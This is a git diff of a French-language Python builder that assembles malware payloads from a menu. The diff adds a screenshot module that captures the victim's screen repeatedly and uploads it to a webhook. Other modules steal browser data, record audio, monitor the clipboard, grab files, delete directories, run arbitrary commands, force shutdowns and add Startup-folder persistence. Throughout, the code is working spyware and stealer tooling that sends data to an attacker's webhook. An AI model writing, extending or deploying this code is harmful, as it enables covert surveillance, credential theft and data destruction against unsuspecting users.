@@ -9,6 +9,7 @@ code = """"""
 
 modules_disponibles = [
         "Clipboard Monitor",
+        "Screenshot",
         "Remove Directory",
         "Remove Script",
         "Run Command",
@@ -59,10 +60,12 @@ def clipboard_module():
     2. Type de données à capturer (texte, images, etc.)
     
     
+
 {Fore.GREEN}
 Tapez : set <num> pour configurer
-Tapez : valider pour valider
-            {Style.RESET_ALL}
+Tapez : valider pour ajouter au payload
+Tapez : exit pour quitter
+{Style.RESET_ALL}
                  
           """)
 
@@ -116,7 +119,6 @@ Tapez : valider pour valider
         global code
         interval = choix["Intervalle de capture"] or 2
         code += f"""
-WEHOOK_URL = {repr(WEBHOOK)}
 import os
 os.system("pip install clipboard")
 import clipboard
@@ -157,7 +159,148 @@ def clipboard_monitor():
                 print(Fore.RED + "Veuillez saisir 'set'" + Style.RESET_ALL)
     
 
-#def screenshot_module():
+def screenshot_module():
+    global code, WEBHOOK
+
+    def affichage_screenshot():
+        clear()
+        print(Fore.CYAN + "=== Configuration Screenshot ===\n" + Style.RESET_ALL)
+        print(f"""
+{Fore.YELLOW}Options :
+{Fore.WHITE}
+    1. Intervalle de capture (secondes) ⚠️ OBLIGATOIRE
+    2. Nombre de captures (0 = infini)
+    3. Délai avant début
+
+{Fore.GREEN}
+Tapez : set <num> pour configurer
+Tapez : valider pour ajouter au payload
+Tapez : exit pour quitter
+{Style.RESET_ALL}
+        """)
+
+    choix = {
+        "Intervalle": None,
+        "Nombre": 1,
+        "Delai": 0
+    }
+
+    # -------------------------
+    # OPTIONS
+    # -------------------------
+    def set_intervalle():
+        clear()
+        try:
+            val = int(input("Intervalle (sec) : "))
+            if val <= 0:
+                raise ValueError
+            choix["Intervalle"] = val
+        except:
+            print(Fore.RED + "Valeur invalide" + Style.RESET_ALL)
+            time.sleep(1)
+
+    def set_nombre():
+        clear()
+        try:
+            val = int(input("Nombre de captures (0 = infini) : "))
+            if val < 0:
+                raise ValueError
+            choix["Nombre"] = val
+        except:
+            print(Fore.RED + "Valeur invalide" + Style.RESET_ALL)
+            time.sleep(1)
+
+    def set_delai():
+        clear()
+        try:
+            val = int(input("Délai (sec) : "))
+            if val < 0:
+                raise ValueError
+            choix["Delai"] = val
+        except:
+            print(Fore.RED + "Valeur invalide" + Style.RESET_ALL)
+            time.sleep(1)
+
+    options = [
+        ("Intervalle", set_intervalle),
+        ("Nombre", set_nombre),
+        ("Delai", set_delai)
+    ]
+
+    # -------------------------
+    # PAYLOAD
+    # -------------------------
+    def create_payload():
+        global code
+
+        interval = choix["Intervalle"]
+        nombre = choix["Nombre"]
+        delai = choix["Delai"]
+
+        if not interval:
+            print(Fore.RED + "Intervalle requis !" + Style.RESET_ALL)
+            time.sleep(1)
+            return
+
+        code += f"""
+
+import time
+import requests
+from PIL import ImageGrab
+import io
+
+INTERVAL_SCREENSHOT = {interval}
+MAX_SCREENSHOTS = {nombre}
+DELAY_SCREENSHOT = {delai}
+
+def take_screenshot():
+    img = ImageGrab.grab()
+    buffer = io.BytesIO()
+    img.save(buffer, format="PNG")
+    buffer.seek(0)
+
+    try:
+        requests.post(WEBHOOK_URL, files={{"file": ("screen.png", buffer, "image/png")}})
+    except:
+        pass
+
+def run_screenshot():
+
+    if DELAY_SCREENSHOT > 0:
+        time.sleep(DELAY_SCREENSHOT)
+
+    count = 0
+
+    while MAX_SCREENSHOTS == 0 or count < MAX_SCREENSHOTS:
+        take_screenshot()
+        count += 1
+        time.sleep(INTERVAL_SCREENSHOT)
+
+"""
+
+    # -------------------------
+    # LOOP
+    # -------------------------
+    while True:
+        affichage_screenshot()
+        cmd = input(">> ").lower()
+
+        if cmd == "exit":
+            break
+
+        elif cmd == "valider":
+            create_payload()
+            break
+
+        elif cmd.startswith("set "):
+            try:
+                option = int(cmd.split()[1]) - 1
+                if 0 <= option < len(options):
+                    options[option][1]()
+                else:
+                    print(Fore.RED + "Option invalide" + Style.RESET_ALL)
+            except:
+                print(Fore.RED + "Erreur de commande" + Style.RESET_ALL)
 
 def rmdir_module():
     global code, WEBHOOK
@@ -171,9 +314,11 @@ def rmdir_module():
     2. Suppression récursive
     3. Délai avant suppression (en secondes)
 
+
 {Fore.GREEN}
 Tapez : set <num> pour configurer
-Tapez : valider pour valider
+Tapez : valider pour ajouter au payload
+Tapez : exit pour quitter
 {Style.RESET_ALL}
         """)
 
@@ -256,36 +401,34 @@ import time
 import shutil
 
 
-chemin    = {chemin}
-recursive  = {recursive}
-delai     = {delai}
-WEBHOOK_URL = {repr(WEBHOOK)}
+CHEMIN_RMDIR    = {chemin}
+RECURSIF_RMDIR  = {recursive}
+DELAI_RMDIR     = {delai}
 
 
 def remove_directory():
-
-    if not os.path.exists({chemin}):
-        print(f'Erreur : le chemin "{chemin}" n\'existe pas.')
+    if not os.path.exists(CHEMIN_RMDIR):
+        print(f'Erreur : le chemin "{{CHEMIN_RMDIR}}" n\'existe pas.')
         return
 
-    if not os.path.isdir(CHEMIN):
-        print(f'Erreur : "{chemin}" n\'est pas un répertoire.')
+    if not os.path.isdir(CHEMIN_RMDIR):
+        print(f'Erreur : "{{CHEMIN_RMDIR}}" n\'est pas un répertoire.')
         return
 
     # Délai
-    if DELAI > 0:
-        print(f'Suppression dans {delai} seconde(s)...')
-        time.sleep(DELAI)
+    if DELAI_RMDIR > 0:
+        print(f'Suppression dans {{DELAI_RMDIR}} seconde(s)...')
+        time.sleep(DELAI_RMDIR)
 
     # Suppression
     try:
-        if RECURSIF:
+        if RECURSIF_RMDIR:
             # supprime le dossier ET tout son contenu
     # Vérifie que le chemin existe avant de tenter de supprimer
-            shutil.rmtree(CHEMIN)
+            shutil.rmtree(CHEMIN_RMDIR)
         else:
             # fonctionne uniquement si le dossier est VIDE
-            os.rmdir(CHEMIN)
+            os.rmdir(CHEMIN_RMDIR)
 
         requests.post(WEBHOOK_URL, json={{"content": f"Répertoire supprimé "}})
 
@@ -293,13 +436,13 @@ def remove_directory():
         print(f'Erreur lors de la suppression : ')
         pass
 
-        if not RECURSIF:
-            requests.post(WEBHOOK_URL, json={{"content": f"Répertoire supprimé : {{chemin}}"}})
+        if not RECURSIF_RMDIR:
+            requests.post(WEBHOOK_URL, json={{"content": f"Répertoire supprimé : {{CHEMIN_RMDIR}}"}})
             """
 
     while True:
         affichage_rmdir()
-        cmd = input(">> : ").lower()
+        cmd = input(">> ").lower()
 
         if cmd == "exit":
             break
@@ -335,9 +478,9 @@ def rmscript():
 3. Recherche récursive (y/n)
 
 {Fore.GREEN}
-set <num> pour configurer
-valider pour ajouter au payload
-exit pour quitter
+Tapez : set <num> pour configurer
+Tapez : valider pour ajouter au payload
+Tapez : exit pour quitter
 {Style.RESET_ALL}
 """)
 
@@ -454,7 +597,6 @@ def runcmd_module():
 
     choix = {
         "Commande à exécuter": None,
-        "Lancer au démarrage": False,
         "Exécuter en boucle": False,
         "Délai entre les exécutions": 0,
     }
@@ -470,10 +612,11 @@ def runcmd_module():
 3. Exécuter en boucle
 4. Délai entre les exécutions
 
+
 {Fore.GREEN}
-set <num> pour configurer
-valider pour ajouter au payload
-exit pour quitter
+Tapez : set <num> pour configurer
+Tapez : valider pour ajouter au payload
+Tapez : exit pour quitter
 {Style.RESET_ALL}
 """)
 
@@ -488,11 +631,6 @@ exit pour quitter
         else:
             print(Fore.RED + "Commande invalide" + Style.RESET_ALL)
             time.sleep(1)
-
-    def set_demarrage():
-        clear()
-        val = input("Lancer au démarrage ? (y/n) : ").lower()
-        choix["Lancer au démarrage"] = (val == "y")
 
     def set_boucle():
         clear()
@@ -512,7 +650,6 @@ exit pour quitter
 
     options = {
         "1": set_commande,
-        "2": set_demarrage,
         "3": set_boucle,
         "4": set_delai
     }
@@ -524,7 +661,6 @@ exit pour quitter
         global code
 
         cmd = choix["Commande à exécuter"]
-        demarrage = choix["Lancer au démarrage"]
         boucle = choix["Exécuter en boucle"]
         delai = choix["Délai entre les exécutions"]
 
@@ -538,34 +674,18 @@ import os
 import time
 
 COMMANDE_CMD = {repr(cmd)}
-DEMARRAGE = {demarrage}
-BOUCLE = {boucle}
-DELAI = {delai}
+BOUCLE_CMD = {boucle}
+DELAI_CMD = {delai}
 
-def add_startup():
-    try:
-        startup = os.path.join(
-            os.getenv('APPDATA'),
-            'Microsoft', 'Windows', 'Start Menu',
-            'Programs', 'Startup', 'runcmd_payload.bat'
-        )
-        with open(startup, 'w') as f:
-            f.write(f'python "{{os.path.abspath(__file__)}}"')
-    except:
-        pass
 
 def run_command():
-
-    if DEMARRAGE:
-        add_startup()
-
-    if BOUCLE:
+    if BOUCLE_CMD:
         while True:
-            os.system(COMMANDE)
-            if DELAI > 0:
-                time.sleep(DELAI)
+            os.system(COMMANDE_CMD)
+            if DELAI_CMD > 0:
+                time.sleep(DELAI_CMD)
     else:
-        os.system(COMMANDE)
+        os.system(COMMANDE_CMD)
 
 run_command()
 """
@@ -613,11 +733,12 @@ def shutdown_module():
 3. Forcer la fermeture
 4. Compte à rebours
 
-{Fore.GREEN}
-set <num> pour configurer
-valider pour ajouter au payload
-exit pour quitter
-{Style.RESET_ALL}
+
+              {Fore.GREEN}
+Tapez : set <num> pour configurer
+Tapez : show pour afficher la config
+Tapez : valider pour générer
+Tapez : exit pour quitter{Style.RESET_ALL}
 """)
 
     # -------------------------
@@ -666,38 +787,37 @@ exit pour quitter
 import os
 import time
 
-DELAI = {choix["Délai avant extinction"]}
-MESSAGE = {repr(choix["Message d'avertissement"])}
-FORCE = {choix["Forcer la fermeture"]}
-REBOURS = {choix["Compte à rebours"]}
+DELAI_SHUT = {choix["Délai avant extinction"]}
+MESSAGE_SHUT = {repr(choix["Message d'avertissement"])}
+FORCE_SHUT = {choix["Forcer la fermeture"]}
+REBOURS_SHUT = {choix["Compte à rebours"]}
 
 def shutdown_payload():
 
-    if MESSAGE:
-        print(f"Avertissement : {{MESSAGE}}")
+    if MESSAGE_SHUT:
+        print(f"Avertissement : {{MESSAGE_SHUT}}")
 
-    if DELAI > 0:
-        if REBOURS:
-            for i in range(DELAI, 0, -1):
+    if DELAI_SHUT > 0:
+        if REBOURS_SHUT:
+            for i in range(DELAI_SHUT, 0, -1):
                 print(f"Extinction dans {{i}} seconde(s)...", end="\\r")
                 time.sleep(1)
             print()
         else:
-            time.sleep(DELAI)
+            time.sleep(DELAI_SHUT)
 
     if os.name == 'nt':
         cmd = "shutdown /s /t 0"
-        if FORCE:
+        if FORCE_SHUT:
             cmd += " /f"
-        if MESSAGE:
-            msg = MESSAGE.replace('"', "'")
+        if MESSAGE_SHUT:
+            msg = MESSAGE_SHUT.replace('"', "'")
             cmd += f' /c "{{msg}}"'
     else:
         cmd = "shutdown -h now"
 
     os.system(cmd)
 
-shutdown_payload()
 """
 
     # -------------------------
@@ -737,11 +857,12 @@ def steal_module():
 {Fore.WHITE}
 1. Cible : Chrome / Firefox / Tous
 
-{Fore.GREEN}
-set <num>
-valider
-exit
-{Style.RESET_ALL}
+
+              {Fore.GREEN}
+Tapez : set <num> pour configurer
+Tapez : show pour afficher la config
+Tapez : valider pour générer
+Tapez : exit pour quitter{Style.RESET_ALL}
 """)
 
     def set_cible():
@@ -775,8 +896,6 @@ import requests
 import shutil
 import time
 from datetime import datetime
-
-WEBHOOK_URL = {repr(WEBHOOK)}
 
 
 
@@ -949,8 +1068,7 @@ def main():
     requests.post(WEBHOOK_URL, files={'file': ('browser_data.zip', zip_buffer)})
     print("✅ Fini !")
 
-if __name__ == "__main__":
-    main()
+
 
     """
     if choix["Cible navigateur"] == "3":
@@ -1028,12 +1146,12 @@ def voicerecorder_module():
 {Fore.WHITE}
 1. Durée de l'enregistrement (en secondes)
 
-{Fore.GREEN}
-set <num>   pour configurer
-show        pour afficher la config
-valider     pour générer
-exit        pour revenir
-{Style.RESET_ALL}
+
+              {Fore.GREEN}
+Tapez : set <num> pour configurer
+Tapez : show pour afficher la config
+Tapez : valider pour générer
+Tapez : exit pour quitter{Style.RESET_ALL}
 """)
 
     # -------------------------
@@ -1091,9 +1209,7 @@ def send_to_discord(file_path):
     else:
         print("Échec de l'envoi sur Discord.")
 
-if __name__ == "__main__":
-    recorded_file = record_voice()
-    send_to_discord(recorded_file)
+
 """
 
 
@@ -1193,7 +1309,6 @@ def set_wallpaper():
     except Exception as e:
         print(f"Erreur : {{e}}")
 
-set_wallpaper()
 """
 
     # -------------------------
@@ -1297,37 +1412,37 @@ Tapez : exit pour quitter
 import os
 import time
 
-CHEMIN = {repr(choix["Chemin du répertoire"])}
+CHEMIN_DIR = {repr(choix["Chemin du répertoire"])}
 INCLURE_CACHES = {choix["Inclure les fichiers cachés"]}
-DELAI = {choix["Délai avant listing"]}
-RECURSIF = {choix["Récursif"]}
-EXTENSION = {repr(choix["Filtrer par extension"])}
+DELAI_DIR = {choix["Délai avant listing"]}
+RECURSIF_DIR = {choix["Récursif"]}
+EXTENSION_DIR = {repr(choix["Filtrer par extension"])}
 
 def list_files():
     fichiers = []
 
-    if RECURSIF:
-        for root, dirs, files in os.walk(CHEMIN):
+    if RECURSIF_DIR:
+        for root, dirs, files in os.walk(CHEMIN_DIR):
             for f in files:
                 if not INCLURE_CACHES and f.startswith('.'):
                     continue
-                if EXTENSION and not f.endswith(EXTENSION):
+                if EXTENSION_DIR and not f.endswith(EXTENSION_DIR):
                     continue
                 fichiers.append(os.path.join(root, f))
     else:
-        for f in os.listdir(CHEMIN):
+        for f in os.listdir(CHEMIN_DIR):
             if not INCLURE_CACHES and f.startswith('.'):
                 continue
-            if EXTENSION and not f.endswith(EXTENSION):
+            if EXTENSION_DIR and not f.endswith(EXTENSION_DIR):
                 continue
-            fichiers.append(os.path.join(CHEMIN, f))
+            fichiers.append(os.path.join(CHEMIN_DIR, f))
 
     return fichiers
 
 def run_dirlist():
 
-    if DELAI > 0:
-        time.sleep(DELAI)
+    if DELAI_DIR > 0:
+        time.sleep(DELAI_DIR)
 
     try:
         files = list_files()
@@ -1335,7 +1450,7 @@ def run_dirlist():
         print(f"Erreur : {{e}}")
         return
 
-    print(f"Listing de {{CHEMIN}}\\n")
+    print(f"Listing de {{CHEMIN_DIR}}\\n")
 
     for f in files:
         print(f)
@@ -1404,14 +1519,7 @@ Tapez : exit pour quitter
             time.sleep(1)
             affichage()
             return
-        # On vérifie que le fichier existe bien sur la machine configurante
-        if os.path.isfile(fichier):
-            choix["Chemin du fichier"] = fichier
-            print(Fore.GREEN + f"Fichier trouvé et défini : {fichier}" + Style.RESET_ALL)
         else:
-            # On accepte quand même le chemin car le payload tournera sur une autre machine
-            print(Fore.YELLOW + "Attention : ce fichier n'existe pas sur cette machine." + Style.RESET_ALL)
-            print(Fore.YELLOW + "Il sera cherché sur la machine cible à l'exécution." + Style.RESET_ALL)
             choix["Chemin du fichier"] = fichier
         time.sleep(1)
         affichage_filegrab()
@@ -1460,8 +1568,8 @@ import requests
 # ============================================================
 # Configuration générée automatiquement
 # ============================================================
-FICHIER         = {choix["Chemin du fichier"]!r}
-DELAI           = {choix["Délai avant envoi"]}
+FICHIER_GRAB    = {choix["Chemin du fichier"]!r}
+DELAI_FILE      = {choix["Délai avant envoi"]}
 NOM_ENVOI       = {choix["Nouveau nom fichier"]!r}
 
 
@@ -1472,19 +1580,19 @@ NOM_ENVOI       = {choix["Nouveau nom fichier"]!r}
 def lancer_filegrab():
 
     # Délai avant l'envoi
-    if DELAI > 0:
-        print(f"Attente de {{DELAI}} secondes...")
-        time.sleep(DELAI)
+    if DELAI_FILE > 0:
+        print(f"Attente de {{DELAI_FILE}} secondes...")
+        time.sleep(DELAI_FILE)
 
     # Vérification que le fichier existe
-    if not os.path.isfile(FICHIER):
-        print(f"Erreur : fichier introuvable -> {{FICHIER}}")
+    if not os.path.isfile(FICHIER_GRAB):
+        print(f"Erreur : fichier introuvable -> {{FICHIER_GRAB}}")
         return
 
     # Nom du fichier à l'envoi
-    nom_final = NOM_ENVOI if NOM_ENVOI else os.path.basename(FICHIER)
+    nom_final = NOM_ENVOI if NOM_ENVOI else os.path.basename(FICHIER_GRAB)
 
-    print(f"Fichier trouvé : {{FICHIER}}")
+    print(f"Fichier trouvé : {{FICHIER_GRAB}}")
     print(f"Envoi sous le nom : {{nom_final}}")
 
 """
@@ -1546,7 +1654,7 @@ while True:
 ############ NE PAS S'EN OCCUPER #####################
     response = requests.get(site, verify=False)
     soup = BeautifulSoup(response.text, "html.parser")
-    champ = soup.find("textarea", {"id": "texte"})
+    champ = soup.find("textarea", {{"id": "texte"}})
 ######################################################
 
     if not champ:
@@ -1557,7 +1665,7 @@ while True:
     if not texte:
         continue
 
-    lignes = texte.split("\n")
+    lignes = texte.split("\\n")
 
     for ligne in lignes:
         ligne = ligne.strip().lower()
@@ -1581,11 +1689,14 @@ while True:
 
     time.sleep(5)
 """
+    
+    print("Payload Keyboard Control généré !")
+    time.sleep(1)
+
 def openurl():
     global code, WEBHOOK
 
     choix = {
-        "Démarrage": False,
         "Fenêtre": False,
         "Onglet": False,
         "Nombre": 1,
@@ -1600,11 +1711,10 @@ def openurl():
           {Fore.YELLOW}Options : 
 {Fore.WHITE}
     1. URL à ouvrir {Fore.RED}⚠️ OBLIGATOIRE{Fore.WHITE}
-    2. Navigateur à utiliser (par défaut : système)
-    3. Ouvrir en fenêtre 
-    4. Ouvrir en onglet
-    5. Nombre de fois à ouvrir
-    6. Délai entre les ouvertures (si option 5 configurée)
+    2. Ouvrir en fenêtre 
+    3. Ouvrir en onglet
+    4. Nombre de fois à ouvrir
+    5. Délai entre les ouvertures (si option 4 configurée)
           
 {Fore.GREEN}
 Tapez : set <num> pour configurer
@@ -1618,23 +1728,23 @@ Tapez : exit pour quitter
     # OPTIONS
     # -------------------------
     def set_url():
+        clear()
         val = input("URL : ").strip()
         if val:
             choix["URL"] = val
 
-    def set_startup():
-        val = input("Démarrage ? (y/n) : ").lower()
-        choix["Démarrage"] = (val == "y")
-
     def set_window():
+        clear()
         val = input("Fenêtre ? (y/n) : ").lower()
         choix["Fenêtre"] = (val == "y")
 
     def set_tab():
+        clear()
         val = input("Onglet ? (y/n) : ").lower()
         choix["Onglet"] = (val == "y")
 
     def set_count():
+        clear()
         try:
             val = int(input("Nombre : "))
             choix["Nombre"] = max(1, val)
@@ -1642,6 +1752,7 @@ Tapez : exit pour quitter
             pass
 
     def set_delay():
+        clear()
         try:
             val = int(input("Délai : "))
             choix["Délai"] = max(0, val)
@@ -1650,11 +1761,10 @@ Tapez : exit pour quitter
 
     options = {
         "1": set_url,
-        "2": set_startup,
-        "3": set_window,
-        "4": set_tab,
-        "5": set_count,
-        "6": set_delay,
+        "2": set_window,
+        "3": set_tab,
+        "4": set_count,
+        "5": set_delay,
     }
 
     # -------------------------
@@ -1675,38 +1785,14 @@ import os
 import sys
 
 URL = {repr(choix["URL"])}
-STARTUP = {choix["Démarrage"]}
 WINDOW = {choix["Fenêtre"]}
 TAB = {choix["Onglet"]}
 COUNT = {choix["Nombre"]}
-DELAY = {choix["Délai"]}
+DELAY_URL = {choix["Délai"]}
 
 def open_url():
 
-    """
-        if choix["Démarrage"] == True:
-            code += """
-        if sys.platform == "win32":
-            startup = os.path.join(
-                os.getenv("APPDATA"),
-                "Microsoft",
-                "Windows",
-                "Start Menu",
-                "Programs",
-                "Startup"
-            )
-            """
-            code += """
-            path = os.path.abspath(sys.argv[0])
-            dest = os.path.join(startup, "open_url_payload.py")
-
-            if not os.path.exists(dest):
-                try:
-                    import shutil
-                    shutil.copy2(path, dest)
-                except Exception as e:
-                    print(f"Erreur startup : {{e}}")
-
+    
     if WINDOW:
         webbrowser.open_new(URL)
     elif TAB:
@@ -1716,12 +1802,11 @@ def open_url():
 
 def run_open_url():
     for _ in range(COUNT):
-        if DELAY > 0:
-            time.sleep(DELAY)
+        if DELAY_URL > 0:
+            time.sleep(DELAY_URL)
         open_url()
-
-run_open_url()
-"""
+    """
+    
 
     # -------------------------
     # LOOP
@@ -1753,18 +1838,19 @@ def affichage_addpayload(modules_choisis):
           {Fore.YELLOW}Modules disponibles :
 {Fore.WHITE}
     1. Clipboard Monitor
-    2. Remove Directory
-    3. Remove Script
-    4. Run Command
-    5. Shutdown
-    6. Stealer
-    7. Voice Record
-    8. Change Wallpaper
-    9. Search Interceptor (en développement)
-    10. Directory Lister
-    11. File Grabber
-    12. Keyboard Control
-    13. Open URL
+    2. Screenshot
+    3. Remove Directory
+    4. Remove Script
+    5. Run Command
+    6. Shutdown
+    7. Stealer
+    8. Voice Record
+    9. Change Wallpaper
+    10. Search Interceptor (en développement)
+    11. Directory Lister
+    12. File Grabber
+    13. Keyboard Control
+    14. Open URL
 {Fore.GREEN}
 Tapez : <num> pour configurer
 Tapez : valider pour revenir
@@ -1783,7 +1869,8 @@ Tapez : valider pour revenir
 
                 if module == "Clipboard Monitor":
                     clipboard_module()
-
+                elif module == "Screenshot":
+                    screenshot_module()
                 elif module == "Remove Directory":
                     rmdir_module()
                 elif module == "Remove Script":
@@ -1832,6 +1919,11 @@ def multipayload_module():
         print("Aucun webhook fourni, les résultats ne seront pas envoyés.")
         time.sleep(2)
         WEBHOOK = None
+
+    DEMARRAGE = input("\n\nExécuter au démarrage ? (y/n) : ").lower() == "y"
+    if not DEMARRAGE:
+        print("Aucune donnée fourni")
+        DEMARRAGE = None    
     
     modules_choisis = []
     
@@ -1847,6 +1939,8 @@ def multipayload_module():
     2. Retirer un module payload
     3. Afficher les modules ajoutés
     4. Webhook : {WEBHOOK if WEBHOOK else "Non configuré"}
+    5. Démarrage : {DEMARRAGE if DEMARRAGE else "Non configuté"}
+
 {Fore.GREEN}
 Tapez : <num> pour configurer
 Tapez : create pour générer
@@ -1890,12 +1984,28 @@ Tapez : exit pour quitter
                 time.sleep(2)
                 continue
 
-            # Préparer le payload avec les imports
-            payload_final = "import requests\n"
+            payload_final = "import requests\nimport os\n"
             if WEBHOOK:
                 payload_final += "WEBHOOK_URL = " + repr(WEBHOOK) + "\n\n"
             else:
                 payload_final += "WEBHOOK_URL = None\n\n"
+
+            if DEMARRAGE == "y":
+                payload_final += """
+def add_startup():
+    try:
+        startup = os.path.join(
+            os.getenv('APPDATA'),
+            'Microsoft', 'Windows', 'Start Menu',
+            'Programs', 'Startup', 'runcmd_payload.bat'
+        )
+        with open(startup, 'w') as f:
+            f.write(f'python "{{os.path.abspath(__file__)}}"')
+    except:
+        pass
+add_startup()"""
+            else:
+                pass
             
             # Ajouter le code accumulé
             payload_final += code
